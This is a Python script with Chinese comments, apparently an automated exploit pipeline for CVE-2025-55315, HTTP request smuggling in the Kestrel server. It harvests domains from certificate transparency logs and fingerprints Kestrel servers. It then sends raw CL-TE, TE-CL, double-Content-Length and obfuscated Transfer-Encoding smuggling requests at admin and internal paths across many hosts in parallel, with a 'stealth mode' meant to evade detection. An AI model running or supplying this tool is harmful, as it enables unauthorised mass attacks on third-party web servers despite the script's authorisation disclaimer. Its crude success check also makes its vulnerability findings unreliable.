#!/usr/bin/env python3
# CVE-2025-55315 自动收集目标并漏洞利用脚本
# 功能：自动收集潜在目标并对其进行漏洞扫描与利用
# 警告：本代码仅用于授权的安全测试和教育目的，未授权使用可能违反法律法规

import requests
import sys
import json
import time
import socket
import ssl
import re
import os
from urllib.parse import urlparse, quote, urljoin
import threading
from concurrent.futures import ThreadPoolExecutor
import random
import base64
import logging

# 配置日志
logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')
logger = logging.getLogger(__name__)

# 全局配置
CONFIG = {
    'stealth_mode': True,  # 隐身模式，增加请求延迟和随机化
    'default_threads': 5,  # 降低默认线程数，提高隐蔽性
    'min_delay': 1.0,  # 最小请求延迟
    'max_delay': 3.0,  # 最大请求延迟
    'user_agents': [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
        'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
    ]
}

class CVE202555315Exploit:
    """CVE-2025-55315漏洞利用类"""
    
    def __init__(self, target_url, verbose=False, proxy=None, stealth_mode=True):
        self.target_url = target_url
        self.verbose = verbose
        self.session = requests.Session()
        self.proxy = proxy
        self.stealth_mode = stealth_mode
        
        if proxy:
            self.session.proxies = {'http': proxy, 'https': proxy}
        
        # 随机化User-Agent以提高隐蔽性
        self.headers = {
            'User-Agent': random.choice(CONFIG['user_agents']),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }
        
        # 解析URL获取主机和端口信息
        parsed_url = urlparse(target_url)
        self.host = parsed_url.netloc.split(':')[0]
        self.port = parsed_url.port if parsed_url.port else (443 if parsed_url.scheme == 'https' else 80)
        self.scheme = parsed_url.scheme
        self.path = parsed_url.path or '/'
    
    def check_vulnerability(self):
        """检查目标是否可能受到CVE-2025-55315影响"""
        if self.verbose:
            print(f"[*] 开始检测目标: {self.target_url}")
        
        try:
            # 隐身模式下的随机延迟
            self._stealthy_wait()
            
            # 发送正常请求以获取基准响应
            base_response = self.session.get(self.target_url, headers=self.headers, timeout=10)
            base_status = base_response.status_code
            
            # 检查服务器是否为Kestrel (关键指示)
            server_header = base_response.headers.get('Server', '')
            if 'Kestrel' in server_header:
                if self.verbose:
                    print(f"[+] 检测到Kestrel服务器: {server_header}")
                return {
                    'vulnerable': True,
                    'server': server_header,
                    'base_status': base_status
                }
            else:
                return {
                    'vulnerable': False,
                    'server': server_header,
                    'base_status': base_status
                }
                
        except Exception as e:
            if self.verbose:
                print(f"[!] 检查过程中发生错误: {str(e)}")
            return {'vulnerable': False, 'error': str(e)}
    
    def exploit_request_smuggling(self, attack_type='cl-te', smuggled_path='/admin', smuggled_data=''):
        """执行HTTP请求走私攻击"""
        if self.verbose:
            print(f"[*] 尝试攻击 {smuggled_path} 使用 {attack_type} 方法")
        
        try:
            # 构建走私请求
            if attack_type == 'cl-te':
                request_content = self._build_cl_te_smuggle(smuggled_path, smuggled_data)
            elif attack_type == 'te-cl':
                request_content = self._build_te_cl_smuggle(smuggled_path, smuggled_data)
            elif attack_type == 'double-cl':
                request_content = self._build_double_cl_smuggle(smuggled_path, smuggled_data)
            elif attack_type == 'obfuscated-te':
                request_content = self._build_obfuscated_te_smuggle(smuggled_path, smuggled_data)
            else:
                return False
            
            # 使用低级socket发送请求
            response = self._send_raw_request(request_content)
            
            if response:
                # 分析响应以判断攻击是否可能成功
                if any(indicator in response for indicator in [b'admin', b'error', b'server', b'internal', b'access', b'401', b'403']):
                    return True
            return False
        
        except Exception as e:
            if self.verbose:
                print(f"[!] 攻击执行过程中发生错误: {str(e)}")
            return False
    
    def _build_cl_te_smuggle(self, path, data):
        """构建Content-Length优先于Transfer-Encoding的走私请求"""
        body = 'A' * 16  # 填充数据
        
        smuggled_request = f"POST {path} HTTP/1.1\r\n"
        smuggled_request += f"Host: {self.host}\r\n"
        smuggled_request += "Content-Length: 0\r\n"
        smuggled_request += "\r\n"
        
        if data:
            smuggled_request += f"POST {path} HTTP/1.1\r\n"
            smuggled_request += f"Host: {self.host}\r\n"
            smuggled_request += f"Content-Length: {len(data)}\r\n"
            smuggled_request += "\r\n"
            smuggled_request += data
        
        # 构建完整的走私请求
        request = f"POST {self.path} HTTP/1.1\r\n"
        request += f"Host: {self.host}\r\n"
        request += f"Content-Length: {len(body)}\r\n"
        request += "Transfer-Encoding: chunked\r\n"
        request += "\r\n"
        request += body
        request += smuggled_request  # 走私的部分
        
        return request.encode()
    
    def _build_te_cl_smuggle(self, path, data):
        """构建Transfer-Encoding优先于Content-Length的走私请求"""
        # 构造分块编码的请求
        chunked_data = f"{len(data):x}\r\n{data}\r\n0\r\n\r\n"
        
        # 构建走私请求
        request = f"POST {self.path} HTTP/1.1\r\n"
        request += f"Host: {self.host}\r\n"
        request += f"Content-Length: {len(chunked_data) + 100}\r\n"  # 故意设置过大
        request += "Transfer-Encoding: chunked\r\n"
        request += "\r\n"
        request += chunked_data
        
        # 添加走私请求
        request += f"GET {path} HTTP/1.1\r\n"
        request += f"Host: {self.host}\r\n"
        request += "\r\n"
        
        return request.encode()
    
    def _build_double_cl_smuggle(self, path, data):
        """构建双重Content-Length头的走私请求"""
        # 两个不同的Content-Length值
        cl1 = 10
        cl2 = 5
        
        request = f"POST {self.path} HTTP/1.1\r\n"
        request += f"Host: {self.host}\r\n"
        request += f"Content-Length: {cl1}\r\n"
        request += f"Content-Length: {cl2}\r\n"
        request += "\r\n"
        request += "A" * cl1  # 第一个长度的内容
        
        # 添加走私请求
        request += f"GET {path} HTTP/1.1\r\n"
        request += f"Host: {self.host}\r\n"
        request += "\r\n"
        
        return request.encode()
    
    def _build_obfuscated_te_smuggle(self, path, data):
        """构建使用混淆Transfer-Encoding头的走私请求"""
        request = f"POST {self.path} HTTP/1.1\r\n"
        request += f"Host: {self.host}\r\n"
        request += f"Content-Length: {len(data) + 100}\r\n"  # 故意设置过大
        request += "Transfer-Encoding: chunked\r\n"  # 正常的TE头
        request += "X-Transfer-Encoding: chunked\r\n"  # 混淆的TE头
        request += "Transfer-Encoding : chunked\r\n"  # 带有空格的TE头
        request += "\r\n"
        
        # 分块数据
        chunked_data = f"{len(data):x}\r\n{data}\r\n0\r\n\r\n"
        request += chunked_data
        
        # 添加走私请求
        request += f"GET {path} HTTP/1.1\r\n"
        request += f"Host: {self.host}\r\n"
        request += "\r\n"
        
        return request.encode()
    
    def _stealthy_wait(self):
        """隐身模式下的随机延迟"""
        if self.stealth_mode:
            delay = random.uniform(CONFIG['min_delay'], CONFIG['max_delay'])
            if self.verbose:
                logger.info(f"[*] 隐身模式: 等待 {delay:.2f} 秒")
            time.sleep(delay)
    
    def _send_raw_request(self, request_content):
        """使用低级socket发送原始HTTP请求"""
        try:
            # 创建socket连接
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            
            # 如果是HTTPS，包装socket
            if self.scheme == 'https':
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=self.host)
            
            # 连接到目标
            sock.connect((self.host, self.port))
            
            # 发送请求
            sock.sendall(request_content)
            
            # 接收响应
            response = b''
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
                if b'\r\n\r\n' in response and len(chunk) < 4096:
                    break
            
            sock.close()
            return response
        except Exception as e:
            if self.verbose:
                logger.error(f"[!] 发送原始请求时出错: {str(e)}")
            return None

class AutoExploitPipeline:
    """自动收集目标并漏洞利用流水线"""
    
    def __init__(self, verbose=False, proxy=None, output_file="vulnerable_targets.txt", stealth_mode=True):
        self.verbose = verbose
        self.proxy = proxy
        self.output_file = output_file
        self.targets = []
        self.vulnerable_targets = []
        self.stealth_mode = stealth_mode
        
    def collect_targets_free(self):
        """免费收集潜在目标"""
        logger.info("[*] 开始收集潜在目标...")
        collected_targets = []
        
        # 1. 从证书透明度日志收集
        logger.info("[*] 从证书透明度日志收集目标...")
        try:
            # 使用crt.sh API（免费）
            crt_sh_url = "https://crt.sh/?q=Kestrel&output=json"
            response = requests.get(crt_sh_url, timeout=30)
            if response.status_code == 200:
                certs = response.json()
                domains = list(set([cert.get('name_value') for cert in certs]))
                # 过滤出可能使用Kestrel的域名
                for domain in domains[:50]:  # 限制数量以避免过多请求
                    if '*' not in domain:  # 排除通配符域名
                        collected_targets.append(f"https://{domain}")
                logger.info(f"[+] 从证书透明度日志获取了 {min(50, len(domains))} 个潜在目标")
        except Exception as e:
            logger.error(f"[-] 证书透明度日志收集失败: {e}")
        
        # 2. 从公开的目标列表收集（如果存在）
        if os.path.exists("targets.txt"):
            try:
                with open("targets.txt", "r") as f:
                    file_targets = [line.strip() for line in f if line.strip()]
                    collected_targets.extend(file_targets)
                logger.info(f"[+] 从targets.txt加载了 {len(file_targets)} 个目标")
            except Exception as e:
                logger.error(f"[-] 读取targets.txt失败: {e}")
        
        # 去重
        collected_targets = list(set(collected_targets))
        self.targets = collected_targets
        
        logger.info(f"[*] 总计收集到 {len(self.targets)} 个唯一目标")
        
        # 保存到文件
        try:
            with open("collected_targets.txt", "w") as f:
                for target in self.targets:
                    f.write(target + "\n")
            logger.info(f"[+] 目标已保存到 collected_targets.txt")
        except Exception as e:
            logger.error(f"[-] 保存collected_targets.txt失败: {e}")
        
        return self.targets
    
    def smart_path_discovery(self, base_url):
        """智能路径发现"""
        if self.verbose:
            print(f"[*] 对 {base_url} 进行智能路径发现...")
        
        discovered_paths = []
        
        # 创建临时会话
        session = requests.Session()
        if self.proxy:
            session.proxies = {'http': self.proxy, 'https': self.proxy}
        
        # 检查robots.txt
        try:
            robots_url = urljoin(base_url, "/robots.txt")
            response = session.get(robots_url, timeout=5)
            if response.status_code == 200:
                paths = re.findall(r'(?:Disallow|Allow):\s*(/[^\s#]+)', response.text)
                discovered_paths.extend(paths)
        except:
            pass
        
        # 常见的敏感路径
        common_paths = [
            '/api/admin', '/api/users', '/internal', '/debug',
            '/admin', '/management', '/dashboard', '/portal',
            '/actuator', '/swagger', '/api', '/graphql',
            '/metrics', '/health', '/info', '/config',
            '/admin/api', '/v1/api', '/v2/api', '/login'
        ]
        discovered_paths.extend(common_paths)
        
        # 去重并过滤空路径
        discovered_paths = list(set([path for path in discovered_paths if path and path != '/']))
        return discovered_paths
    
    def exploit_target(self, target):
        """攻击单个目标"""
        try:
            # 检查目标是否可达
            if not self._is_target_reachable(target):
                if self.verbose:
                    print(f"[-] 目标 {target} 不可达")
                return {'vulnerable': False, 'target': target}
            
            # 创建漏洞利用实例
            exploit = CVE202555315Exploit(target, self.verbose, self.proxy, self.stealth_mode)
            
            # 检查漏洞
            check_result = exploit.check_vulnerability()
            if not check_result.get('vulnerable', False):
                return {'vulnerable': False, 'target': target, 'server': check_result.get('server', '')}
            
            # 服务器使用Kestrel，继续攻击
            if self.verbose:
                print(f"[+] {target} 运行Kestrel服务器，可能存在漏洞")
            
            # 智能路径发现
            paths = self.smart_path_discovery(target)
            
            # 尝试所有路径和攻击类型
            for path in paths[:5]:  # 限制尝试的路径数量以提高效率
                for attack_type in ['cl-te', 'te-cl']:  # 先尝试最常见的两种攻击类型
                    try:
                        success = exploit.exploit_request_smuggling(
                            attack_type=attack_type,
                            smuggled_path=path,
                            smuggled_data=''
                        )
                        
                        if success:
                            print(f"[+] 发现漏洞! 目标: {target}, 路径: {path}, 攻击类型: {attack_type}")
                            return {
                                'vulnerable': True,
                                'target': target,
                                'path': path,
                                'attack_type': attack_type,
                                'server': check_result.get('server', '')
                            }
                    except Exception as e:
                        if self.verbose:
                            print(f"[-] 攻击 {path} 失败: {e}")
                    
                    # 隐身模式下增加延迟
                    if self.stealth_mode:
                        time.sleep(random.uniform(0.5, 1.5))
            
            return {'vulnerable': False, 'target': target, 'server': check_result.get('server', '')}
        except Exception as e:
            if self.verbose:
                print(f"[-] 处理目标 {target} 时出错: {e}")
            return {'vulnerable': False, 'target': target, 'error': str(e)}
    
    def _is_target_reachable(self, target):
        """检查目标是否可达"""
        try:
            # 快速检查目标是否可达
            parsed_url = urlparse(target)
            host = parsed_url.netloc.split(':')[0]
            port = parsed_url.port if parsed_url.port else (443 if parsed_url.scheme == 'https' else 80)
            
            # 使用socket连接测试
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            result = sock.connect_ex((host, port))
            sock.close()
            return result == 0
        except:
            return False
    
    def run_auto_exploit(self):
        """运行自动漏洞利用流程"""
        # 1. 收集目标
        if not self.targets:
            self.collect_targets_free()
        
        if not self.targets:
            logger.error("[-] 未收集到任何目标，退出")
            return []
        
        print(f"\n[!] 开始对 {len(self.targets)} 个目标进行自动漏洞扫描与利用")
        print(f"[!] 使用隐身模式，线程数: {CONFIG['default_threads']}")
        print(f"[!] 结果将保存到: {self.output_file}")
        print("="*60)
        
        # 清空输出文件
        open(self.output_file, "w").close()
        
        # 使用线程池并行处理
        with ThreadPoolExecutor(max_workers=CONFIG['default_threads']) as executor:
            # 提交所有攻击任务
            futures = {executor.submit(self.exploit_target, target): target for target in self.targets}
            
            # 处理结果
            for future in futures:
                try:
                    result = future.result()
                    if result['vulnerable']:
                        logger.info(f"[+] 发现漏洞: {result['target']}")
                        self.vulnerable_targets.append(result)
                        
                        # 保存结果到文件
                        with open(self.output_file, "a") as f:
                            f.write(f"VULNERABLE: {result['target']}\n")
                            f.write(f"  路径: {result['path']}\n")
                            f.write(f"  攻击类型: {result['attack_type']}\n")
                            f.write(f"  服务器: {result['server']}\n")
                            f.write("="*60 + "\n")
                    elif self.verbose:
                        logger.info(f"[-] {result['target']} 未发现漏洞")
                except Exception as e:
                    if self.verbose:
                        logger.error(f"[-] 处理异常: {e}")
        
        # 输出总结报告
        self._print_summary()
        
        return self.vulnerable_targets
    
    def _print_summary(self):
        """打印总结报告"""
        print("\n" + "="*60)
        print(" 漏洞扫描与利用总结报告 ")
        print("="*60)
        print(f"扫描目标总数: {len(self.targets)}")
        print(f"发现漏洞数: {len(self.vulnerable_targets)}")
        print(f"漏洞比例: {(len(self.vulnerable_targets) / len(self.targets) * 100):.2f}%")
        print("="*60)
        
        if self.vulnerable_targets:
            print("\n发现的漏洞目标:")
            for i, target_info in enumerate(self.vulnerable_targets, 1):
                print(f"\n{i}. {target_info['target']}")
                print(f"   - 路径: {target_info['path']}")
                print(f"   - 攻击类型: {target_info['attack_type']}")
                print(f"   - 服务器: {target_info['server']}")
            
            print(f"\n详细结果已保存到 {self.output_file}")
        else:
            print("\n未发现任何存在漏洞的目标")

def main():
    # 显示安全警告
    print("="*60)
    print(" CVE-2025-55315 自动收集目标并漏洞利用脚本 ")
    print("="*60)
    print("[!] 警告: 本脚本仅用于授权的安全测试和教育目的！")
    print("[!] 未授权使用可能违反法律法规！")
    print("="*60)
    
    # 获取用户确认
    confirm = input("\n是否确认在授权环境中使用此脚本？(y/n): ")
    if confirm.lower() != 'y':
        print("[!] 操作已取消")
        sys.exit(0)
    
    try:
        # 创建并运行自动攻击流水线
        pipeline = AutoExploitPipeline(verbose=True, stealth_mode=True)
        pipeline.run_auto_exploit()
        
    except KeyboardInterrupt:
        print("\n[!] 用户中断操作")
    except Exception as e:
        print(f"\n[!] 错误: {str(e)}")
        import traceback
        traceback.print_exc()
    finally:
        print("\n[*] 脚本执行完毕")

if __name__ == "__main__":
    main()